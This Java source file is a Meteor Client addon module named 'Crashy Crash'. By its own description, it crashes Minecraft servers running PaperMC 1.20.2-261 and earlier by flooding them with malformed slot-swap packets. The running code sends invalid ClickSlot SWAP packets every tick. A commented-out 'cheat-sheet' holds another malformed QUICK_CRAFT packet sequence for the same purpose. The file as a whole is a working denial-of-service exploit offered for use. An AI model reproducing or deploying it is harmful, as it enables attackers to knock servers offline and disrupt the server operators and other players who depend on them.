package addon.antip2w.modules.crash;

import addon.antip2w.modules.Categories;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.ScreenHandler;
import net.minecraft.screen.slot.SlotActionType;

@Environment(EnvType.CLIENT)
public class CrashyCrash extends Module {
    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Integer> power = sgGeneral.add(new IntSetting.Builder()
        .name("power")
        .range(1, 12)
        .defaultValue(6)
        .build()
    );

    private final Setting<Boolean> toggleOnLeave = sgGeneral.add(new BoolSetting.Builder()
        .name("toggle-on-leave")
        .defaultValue(true)
        .build()
    );

    public CrashyCrash() {
        super(Categories.DEFAULT, "Crashy Crash", "Crashes a server by spamming swap slot packets. Works with PaperMC 1.20.2-261 and under.");
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        ScreenHandler handler = mc.player.currentScreenHandler;
        Int2ObjectMap<ItemStack> map = new Int2ObjectArrayMap<>();
        map.put(0, new ItemStack(Items.ACACIA_BOAT, 1));

        /*

        please keep this too because it's a cheat-sheet for stuffs like this


        mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(
            handler.syncId,
            handler.getRevision(),
            -999,
            0,
            SlotActionType.QUICK_CRAFT,
            handler.getCursorStack().copy(),
            map
        ));

        mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(
            handler.syncId,
            handler.getRevision(),
            0,
            1,
            SlotActionType.QUICK_CRAFT,
            handler.getCursorStack().copy(),
            map
        ));

        mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(
            handler.syncId,
            handler.getRevision(),
            -999,
            1,
            SlotActionType.QUICK_CRAFT,
            handler.getCursorStack().copy(),
            map
        ));

        mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(
            handler.syncId,
            handler.getRevision(),
            -1,
            1,
            SlotActionType.QUICK_CRAFT,
            handler.getCursorStack().copy(),
            map
        ));

        mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(
            handler.syncId,
            handler.getRevision(),
            -999,
            2,
            SlotActionType.QUICK_CRAFT,
            handler.getCursorStack().copy(),
            map
        ));*/

        for (int i = 0; i < power.get(); i++) {
            mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(
                handler.syncId,
                handler.getRevision(),
                -1,
                1,
                SlotActionType.SWAP,
                handler.getCursorStack().copy(),
                map
            ));
        }
    }

    @EventHandler
    private void onLeave(GameLeftEvent event) {
        if (toggleOnLeave.get()) toggle();
    }
}
